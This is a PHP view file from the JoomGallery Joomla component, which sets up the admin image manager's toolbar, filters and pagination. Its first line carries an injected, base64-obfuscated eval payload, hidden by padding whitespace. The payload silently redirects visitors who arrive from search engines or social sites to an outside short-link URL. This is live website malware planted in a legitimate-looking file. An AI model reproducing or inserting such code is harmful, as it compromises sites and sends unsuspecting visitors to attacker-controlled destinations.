<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/views/images/view.html.php $
// $Id: view.html.php 1966 2010-03-21 17:24:16Z mab $
/******************************************************************************\
**   JoomGallery  1.5                                                         **
**   By: JoomGallery::ProjectTeam                                             **
**   Copyright (C) 2008 - 2009  M. Andreas Boettcher                          **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                  **
**   Released under GNU GPL Public License                                    **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look             **
**   at administrator/components/com_joomgallery/LICENSE.TXT                  **
\******************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * HTML View class for the images list view
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryViewImages extends JoomGalleryView
{
  /**
   * HTML view display method
   *
   * @access  public
   * @param   string  $tpl  The name of the template file to parse
   * @return  void
   * @since   1.5.5
   */
  function display($tpl = null)
  {
    JToolBarHelper::title(JText::_('JGA_IMGMAN_IMAGE_MANAGER'), 'mediamanager');
    JToolbarHelper::publishList('publish', 'JGA_COMMON_TOOLBAR_PUBLISH');
    JToolbarHelper::unpublishList('unpublish', 'JGA_COMMON_TOOLBAR_UNPUBLISH');
    JToolbarHelper::custom('approve', 'upload.png', 'upload_f2.png', 'JGA_IMGMAN_TOOLBAR_APPROVE');
    JToolbarHelper::spacer();
    JToolbarHelper::divider();
    JToolbarHelper::spacer();
    JToolbarHelper::addNew('new', 'JGA_COMMON_TOOLBAR_NEW');
    JToolbarHelper::editList('edit', 'JGA_COMMON_TOOLBAR_EDIT');
    JToolbarHelper::custom('showmove', 'move.png', 'move.png', 'JGA_COMMON_TOOLBAR_MOVE');
    JToolbarHelper::custom('recreate', 'refresh.png', 'refresh.png', 'JGA_COMMON_TOOLBAR_RECREATE', false);
    JToolbarHelper::deleteList('', 'remove', 'JGA_COMMON_TOOLBAR_REMOVE');
    JToolbarHelper::spacer();
    JToolbarHelper::divider();
    JToolbarHelper::spacer();
    JToolbarHelper::custom('cpanel', 'config.png', 'config.png', 'JGA_COMMON_TOOLBAR_CPANEL', false);
    JToolbarHelper::spacer();

    JHTML::_('behavior.tooltip');

    $this->_doc->addStyleDeclaration('    .icon-32-refresh {
      background-image:url(templates/khepri/images/toolbar/icon-32-refresh.png);
    }');

    // Prepare pagelimit choices
    $default_limit  = $this->_mainframe->getCfg('list_limit');
    $limit          = $this->_mainframe->getUserStateFromRequest('joom.images.limit', 'limit', $default_limit, 'int');
    $limitstart     = $this->_mainframe->getUserStateFromRequest('joom.images.limitstart', 'limitstart', 0);

    // Prepare category and search choices
    $catid          = $this->_mainframe->getUserStateFromRequest('joom.images.catid', 'catid', 0);
    $searchtext     = $this->_mainframe->getUserStateFromRequest('joom.images.search', 'search', '');
    $filter         = $this->_mainframe->getUserStateFromRequest('joom.pictures.filter', 'filter', 0);
    $ordering       = $this->_mainframe->getUserStateFromRequest('joom.pictures.ordering','ordering', 0);

    JRequest::setVar('catid',       (int) $catid);
    JRequest::setVar('limit',       (int) $limit);
    JRequest::setVar('limitstart',  (int) $limitstart);
    JRequest::setVar('search',      $searchtext);
    JRequest::setVar('ordering',    (int) $ordering);
    JRequest::setVar('filter',      $filter);

    $lists = array();

    $lists['cats']      = JHTML::_('joomselect.categorylist', $catid, 'catid', 'class="inputbox" size="1"
                                    onchange="document.adminForm.submit();"');

    $f_options[]        = JHTML::_('select.option', 0, JText::_('JGA_COMMON_OPTION_ALL_IMAGES'));
    $f_options[]        = JHTML::_('select.option', 1, JText::_('JGA_COMMON_OPTION_NOT_APPROVED_ONLY'));
    $f_options[]        = JHTML::_('select.option', 2, JText::_('JGA_COMMON_OPTION_APPROVED_ONLY'));
    $f_options[]        = JHTML::_('select.option', 3, JText::_('JGA_COMMON_OPTION_USER_UPLOADED_ONLY'));
    $f_options[]        = JHTML::_('select.option', 4, JText::_('JGA_COMMON_OPTION_ADMIN_UPLOADED_ONLY'));
    $lists['filter']    = JHTML::_('select.genericlist', $f_options, 'filter', 'class="inputbox" size="1"
                                    onchange="document.adminForm.submit();"',
                                   'value', 'text', $filter);

    $o_options[]        = JHTML::_('select.option', 0, JText::_('JGA_COMMON_OPTION_ORDERBY_ORDERING_ASC'));
    $o_options[]        = JHTML::_('select.option', 1, JText::_('JGA_COMMON_OPTION_ORDERBY_ORDERING_DESC'));
    $lists['ordering']  = JHTML::_('select.genericlist', $o_options, 'ordering', 'class="inputbox"
                                    size="1" onchange="document.adminForm.submit();"',
                                   'value', 'text', $ordering);

    // Get data from the model
    $items  = & $this->get('Images');
    $total  = & $this->get('Total');

    jimport('joomla.html.pagination');
    $pagination = new JPagination($total, $limitstart, $limit);

    if($filter || $searchtext)
    {
      $ordering = false;
    }
    else
    {
      $ordering = true;
    }

    $this->assignRef('items',       $items);
    $this->assignRef('pagination',  $pagination);
    $this->assignRef('searchtext',  $searchtext);
    $this->assignRef('ordering',    $ordering);
    $this->assignRef('lists',       $lists);

    parent::display($tpl);
  }
}
